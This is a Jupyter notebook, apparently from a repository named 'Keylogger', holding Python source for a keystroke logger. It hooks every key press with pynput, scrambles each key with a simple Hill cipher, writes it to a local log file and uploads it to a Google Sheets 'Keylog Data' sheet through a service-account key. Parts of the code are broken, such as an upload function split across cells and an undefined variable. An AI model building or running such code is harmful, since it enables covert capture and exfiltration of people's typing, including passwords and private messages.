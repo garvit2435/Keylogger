{
  "nbformat": 4,
  "nbformat_minor": 5,
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.8.3"
    },
    "colab": {
      "provenance": []
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "qzMcF0KyO83z"
      },
      "source": [
        "!pip install pynput"
      ],
      "id": "qzMcF0KyO83z",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "HhcY53OXO836"
      },
      "source": [],
      "id": "HhcY53OXO836",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "CgcBEm1YO838"
      },
      "source": [
        "import os\n",
        "import sys\n",
        "import math\n",
        "import numpy as np\n",
        "from pynput.keyboard import Key, Listener"
      ],
      "id": "CgcBEm1YO838",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "gR6OkL9AO83_"
      },
      "source": [
        "import logging\n",
        "from datetime import datetime\n",
        "import gspread\n",
        "from oauth2client.service_account import ServiceAccountCredentials"
      ],
      "id": "gR6OkL9AO83_",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "FgJCmsYSO84A"
      },
      "source": [
        "!pip install gspread"
      ],
      "id": "FgJCmsYSO84A",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xMw21A2dO84D"
      },
      "source": [
        "!pip install oauth2client"
      ],
      "id": "xMw21A2dO84D",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "qZP1wLocO84F"
      },
      "source": [
        "# using credentials to create a client to interact with the Google Drive API\n",
        "scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']\n",
        "\n"
      ],
      "id": "qZP1wLocO84F",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "laBPGDYGO84I"
      },
      "source": [
        "creds = ServiceAccountCredentials.from_json_keyfile_name('client_secrets.json', scope)\n"
      ],
      "id": "laBPGDYGO84I",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xnlEvY-HO84K"
      },
      "source": [
        "client = gspread.authorize(creds)\n",
        "sheet = client.open(\"Keylog Data\").sheet1"
      ],
      "id": "xnlEvY-HO84K",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "7g2tisbcO84M"
      },
      "source": [
        "def uploadToDatabase(key):\n",
        "    print(\"Uploading to database: \", end=\" \")"
      ],
      "id": "7g2tisbcO84M",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "fAQzeMiBO84P"
      },
      "source": [
        "now = datetime.now()\n",
        "dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\")\n",
        "row = [dt_string, key]\n",
        "print(row)\n",
        "index = 1\n",
        "sheet.insert_row(row, index)"
      ],
      "id": "fAQzeMiBO84P",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dH-KOOOMO84Q"
      },
      "source": [
        "log_dir = \"\"\n",
        "print(\"Keylogger is Running\")\n",
        "logging.basicConfig(filename=(log_dir + \"key_log.txt\"),\n",
        "level=logging.DEBUG, format='%(asctime)s: %(message)s')\n",
        "hill_key='oplk'"
      ],
      "id": "dH-KOOOMO84Q",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lkgNqpOUO84S"
      },
      "source": [
        "def encrypt(msg):\n",
        "    # Replace spaces with nothing\n",
        "    msg = msg.replace(\" \", \"\")\n",
        "    # Ask for keyword and get encryption matrix\n",
        "    C = make_key()\n",
        "    # Append zero if the messsage isn't divisble by 2 len_check =\n",
        "    len(msg) % 2 == 0\n",
        "    if not len_check:\n",
        "        msg += \"0\"\n",
        "    # Populate message matrix\n",
        "    P = create_matrix_of_integers_from_string(msg) # Calculate length of the message\n",
        "    msg_len = int(len(msg) / 2)\n",
        "    # Calculate P * C\n",
        "    encrypted_msg = \"\"\n",
        "    for i in range(msg_len):\n",
        "        # Dot product\n",
        "        row_0 = P[0][i] * C[0][0] + P[1][i] * C[0][1]\n",
        "        # Modulate and add 65 to get back to the A-Z range in ascii\n",
        "        integer = int(row_0 % 26 + 65)\n",
        "        # Change back to chr type and add to text\n",
        "        encrypted_msg += chr(integer)\n",
        "        # Repeat for the second column\n",
        "        row_1 = P[0][i] * C[1][0] + P[1][i] * C[1][1]\n",
        "        integer = int(row_1 % 26 + 65)\n",
        "        encrypted_msg += chr(integer)\n",
        "    return encrypted_msg"
      ],
      "id": "lkgNqpOUO84S",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3rJTPLvDO84U"
      },
      "source": [
        "def make_key():\n",
        "    # Make sure cipher determinant is relatively prime to 26 and only a/A - z/Z are given\n",
        "    determinant = 0\n",
        "    C = None\n",
        "    while True:\n",
        "        cipher = hill_key\n",
        "        C = create_matrix_of_integers_from_string(cipher)\n",
        "        determinant = C[0][0] * C[1][1] - C[0][1] * C[1][0]\n",
        "        determinant = determinant % 26\n",
        "        inverse_element = find_multiplicative_inverse(determinant)\n",
        "        if inverse_element == -1:\n",
        "            print(\"Determinant is not relatively prime to 26, uninvertible key\")\n",
        "        elif np.amax(C) > 26 and np.amin(C) < 0:\n",
        "            print(\"Only a-z characters are accepted\")\n",
        "            print(np.amax(C), np.amin(C))\n",
        "        else:\n",
        "            break\n",
        "    return C"
      ],
      "id": "3rJTPLvDO84U",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "MS4Zx-xDO84X"
      },
      "source": [
        "def find_multiplicative_inverse(determinant):\n",
        "    multiplicative_inverse = -1\n",
        "    for i in range(26):\n",
        "        inverse = determinant * i\n",
        "        if inverse % 26 == 1:\n",
        "            multiplicative_inverse = i\n",
        "            break\n",
        "    return multiplicative_inverse"
      ],
      "id": "MS4Zx-xDO84X",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "X40G9gYxO84Y"
      },
      "source": [
        "def create_matrix_of_integers_from_string(string):\n",
        "    # Map string to a list of integers a/A <-> 0, b/B <-> 1 ... z/Z <-> 25\n",
        "    integers = [chr_to_int(c) for c in string]\n",
        "    length = len(integers)\n",
        "    M = np.zeros((2, int(length / 2)), dtype=np.int32)\n",
        "    iterator = 0\n",
        "    for column in range(int(length / 2)):\n",
        "        for row in range(2):\n",
        "            M[row][column] = integers[iterator]\n",
        "            iterator += 1\n",
        "    return M"
      ],
      "id": "X40G9gYxO84Y",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dhXjrnYdO84Z"
      },
      "source": [
        "def chr_to_int(char):\n",
        "    char = char.upper()\n",
        "    integer = ord(char) - 65\n",
        "    return integer"
      ],
      "id": "dhXjrnYdO84Z",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "DCcL1H9tO84a"
      },
      "source": [
        "def on_press(key):\n",
        "    s = str(key)[1] + 'x'\n",
        "    print(s)\n",
        "    encryptedKey = encrypt(s)\n",
        "    uploadToDatabase(str(encryptedKey)) # uploading encrypted key pressed to cloud database\n",
        "    logging.info(str(key)) # logging key pressed"
      ],
      "id": "DCcL1H9tO84a",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "XNiPj6M7O84b"
      },
      "source": [
        "with Listener(on_press=on_press) as listener:\n",
        "    listener.join()"
      ],
      "id": "XNiPj6M7O84b",
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "JpdBB4WHO84c"
      },
      "source": [],
      "id": "JpdBB4WHO84c",
      "execution_count": null,
      "outputs": []
    }
  ]
}